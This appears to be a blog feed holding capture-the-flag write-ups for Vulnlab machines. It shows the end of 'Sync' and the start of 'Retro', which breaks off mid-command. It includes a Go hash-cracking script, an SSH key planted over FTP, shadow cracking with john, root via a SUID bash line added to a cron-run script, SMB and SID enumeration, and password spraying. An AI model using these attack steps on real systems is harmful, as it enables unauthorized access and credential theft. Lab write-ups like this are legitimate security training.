&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;bufio&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;crypto/md5&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;encoding/hex&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;os&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;sync&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;targetHash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;76&amp;lt;redacted&amp;gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/home/syl/tools/lists/rockyou.txt&quot;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sync&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WaitGroup&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scanner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufio&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NewScanner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scanner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;wg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hashedLine&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashedLine&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetHash&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Match found: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scanner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scanner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;wg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wait&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6c4972f3717a5e881e282ad3105de01e|admin|&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EncodeToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can adjust the code for each user. Within seconds of running the code, we would get a match for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;triss&lt;/code&gt; user.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Sync$ go run ./scripts/custom_crack.go 
Match found: g...&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The hash of the admin wasn’t found.&lt;/p&gt;

&lt;p&gt;Those credentials were valid of the FTP service, and It seemed like that we are in the home directory of that user.&lt;/p&gt;

&lt;p&gt;We can try to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; with that user, but the SSH login isn’t permitted, so we can create an SSH folder &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; from the FTP, and we can put our public SSH key into a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; then we would be able to connect using our public key!&lt;/p&gt;

&lt;h2 id=&quot;switching-the-user-and-privilege-escalation&quot;&gt;Switching the user and Privilege Escalation&lt;/h2&gt;

&lt;p&gt;We can find more users within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jennifer
sa
triss
ubuntu
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Upon listing the directories, we would find a folder called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup&lt;/code&gt; which sits in the root of the file system. In that folder there are many zip files related to some kind of backup.&lt;/p&gt;

&lt;p&gt;We can exfiltrate all the files and extract them to see what’s inside.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# After the exfiltration&lt;/span&gt;
find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;*.zip&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;unzip -d &quot;${1%.*}&quot; &quot;$1&quot;&apos;&lt;/span&gt; _ &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That bash one-liner would extract each zip file in its own directory.&lt;/p&gt;

&lt;p&gt;We would find that those folders are mostly the same and the name of the file is a timestamp, in my specific case here are a couple of files:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1703495041.zip -&amp;gt; Monday, December 25, 2023 9:04:01 AM
1703495161.zip -&amp;gt; Monday, December 25, 2023 9:06:01 AM
1703495281.zip -&amp;gt; Monday, December 25, 2023 9:08:01 AM
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see a pattern here, those zip files are being created every 2 minutes. We would &lt;strong&gt;note&lt;/strong&gt; that and come back for it later on.&lt;/p&gt;

&lt;p&gt;Upon unzipping those files, we would find the following structure:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|-- httpd
|   |-- db
|   |   `-- site.db
|   |-- migrate
|   `-- www
|       |-- dashboard.php
|       |-- index.php
|       `-- logout.php
|-- passwd
|-- rsyncd.conf
`-- shadow
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shadow&lt;/code&gt; files, since that they are the ones that stand out at first. And having those files, we can use the utility from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshadow&lt;/code&gt; to combine the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shadow&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt; file into a single file that we can use to crack the passwords for the users.&lt;/p&gt;

&lt;p&gt;To install the tool &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshadow&lt;/code&gt; we would need to install &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt install john -y
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unshadow ./exfiltrated/ssh/backup/1703494921/tmp/backup/passwd ./exfiltrated/ssh/backup/1703494921/tmp/backup/shadow &amp;gt; tmp_shadow
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we can crack it (&lt;strong&gt;or can we?&lt;/strong&gt;):&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Sync$ john ./tmp_shadow --wordlist=/home/syl/tools/lists/rockyou.txt                                                                                                                                                      
No password hashes loaded (see FAQ)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We cannot load those hashes in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; with the default arguments because the hash function that is being used is called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yescrypt&lt;/code&gt;. We can conclude the hashing function by inspecting the hashes that we in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tmp_shadow&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$y$j9T$DBxmxcNWJlhvgfWCUTbEC0&amp;lt;redacted&amp;gt;
$y$j9T$jJFOBCaiGJUmyZZRFn5aG1&amp;lt;redacted&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have the starting sequence &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$y$&lt;/code&gt; which is related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yescrypt&lt;/code&gt;. If you need more information about it, you can &lt;a href=&quot;https://security.stackexchange.com/questions/252665/does-john-the-ripper-not-support-yescrypt&quot;&gt;read this!&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We can use the argument &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--fromat=crypt&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Sync$ john ./tmp_shadow --format=crypt                                                                                                                                                          
Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64])
Will run 4 OpenMP threads
Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
0g 0:00:00:51 0% 2/3 0g/s 87.90p/s 119.4c/s 119.4C/s leslie..boston
&amp;lt;redacted&amp;gt;           (jennifer)
&amp;lt;redacted&amp;gt;           (triss)
&amp;lt;redacted&amp;gt;           (sa)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we have the passwords for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jennifer&lt;/code&gt; and the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sa&lt;/code&gt;. Upon changing the user to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jennifer&lt;/code&gt; we would find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; hash.&lt;/p&gt;

&lt;p&gt;We can not run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas&lt;/code&gt; for further enumeration on both accounts &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sa,jennifer&lt;/code&gt; and we would find that we own a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin/backup.sh&lt;/code&gt;. Upon inspecting the file, we would see that the file contains a script that is being used to back up the files that we saw earlier (the zipped backups).&lt;/p&gt;

&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pspy&lt;/code&gt; we can monitor the currently running process by all users, and we would see that a backup is being created every 2 minutes (just like the timestamps we saw earlier).&lt;/p&gt;

&lt;p&gt;We can edit the script, and we can add the line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod u+s /bin/bash&lt;/code&gt; to the end of it. After 2 minutes, we can see if it works by invoking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash -p&lt;/code&gt;, that would give us the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Name OS Difficulty Sync Linux (Ubuntu) Easy</summary></entry><entry><title type="html">Vulnlab - Retro [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro.html" rel="alternate" type="text/html" title="Vulnlab - Retro [Easy]" /><published>2023-12-19T00:00:00+02:00</published><updated>2023-12-19T00:00:00+02:00</updated><id>http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/12/19/vulnlab-retro.html">&lt;p&gt;Retro is an easy windows (active directory) machine by Vulnlab.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I’ve tried to show as many methods as possible to retrieve the same thing, for example retrieving the administrator’s NTLM hash and changing the password for a user with 2 different methods, I hope that you can learn more that way which is the whole point of this write-up!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;

&lt;p&gt;Started with a simple nmap scan:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN ^Cap.txt -sC -sV 10.10.64.243 -Pn --min-rate 10000
...
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=12/19%Time=6581A887%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03&quot;);
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next I’ve used enum4linux which showed me the FQDN, Domain and not much else.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ enum4linux 10.10.64.243
NetBIOS computer name: DC
NetBIOS domain name: RETRO
DNS domain: retro.vl
FQDN: DC.retro.vl
Derived membership: domain member
Derived domain: RETRO
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I went on to enumerate the SMB protocol.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u &apos;Guest&apos; -p &apos;&apos; --shares
SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.64.243    445    DC               [+] retro.vl\Guest: 
SMB         10.10.64.243    445    DC               [*] Enumerated shares
SMB         10.10.64.243    445    DC               Share           Permissions     Remark
SMB         10.10.64.243    445    DC               -----           -----------     ------
SMB         10.10.64.243    445    DC               ADMIN$                          Remote Admin
SMB         10.10.64.243    445    DC               C$                              Default share
SMB         10.10.64.243    445    DC               IPC$            READ            Remote IPC
SMB         10.10.64.243    445    DC               NETLOGON                        Logon server share 
SMB         10.10.64.243    445    DC               Notes                           
SMB         10.10.64.243    445    DC               SYSVOL                          Logon server share 
SMB         10.10.64.243    445    DC               Trainees        READ            
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I went in and checked the readable share “Trainees” and I got the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Important.txt&lt;/code&gt; which contained the following text:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That is definitely interesting it does hint that there may be weak credentials, so let’s try to enumerate some users. Since that the account “Guest” is working, I used the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lookupsid&lt;/code&gt; by the impacket’s scripts.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/tools/impacket/examples$ python3 lookupsid.py Guest@10.10.64.243
Impacket v0.12.0.dev1+20230921.20754.9c8f344b - Copyright 2023 Fortra

Password:
[*] Brute forcing SIDs at 10.10.64.243
[*] StringBinding ncacn_np:10.10.64.243[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
512: RETRO\Domain Admins (SidTypeGroup)
513: RETRO\Domain Users (SidTypeGroup)
514: RETRO\Domain Guests (SidTypeGroup)
515: RETRO\Domain Computers (SidTypeGroup)
516: RETRO\Domain Controllers (SidTypeGroup)
517: RETRO\Cert Publishers (SidTypeAlias)
518: RETRO\Schema Admins (SidTypeGroup)
519: RETRO\Enterprise Admins (SidTypeGroup)
520: RETRO\Group Policy Creator Owners (SidTypeGroup)
521: RETRO\Read-only Domain Controllers (SidTypeGroup)
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
525: RETRO\Protected Users (SidTypeGroup)
526: RETRO\Key Admins (SidTypeGroup)
527: RETRO\Enterprise Key Admins (SidTypeGroup)
553: RETRO\RAS and IAS Servers (SidTypeAlias)
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
1000: RETRO\DC$ (SidTypeUser)
1101: RETRO\DnsAdmins (SidTypeAlias)
1102: RETRO\DnsUpdateProxy (SidTypeGroup)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We got a couple of users:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1000: RETRO\DC$ (SidTypeUser)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1109: RETRO\tblack (SidTypeUser)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’ve stripped the users and added them to users.txt with the addition of ‘administrator’. Since I knew that there would be weak credentials, I tried with the following pattern &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user:pass&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u ./users.txt -p ./users.txt 
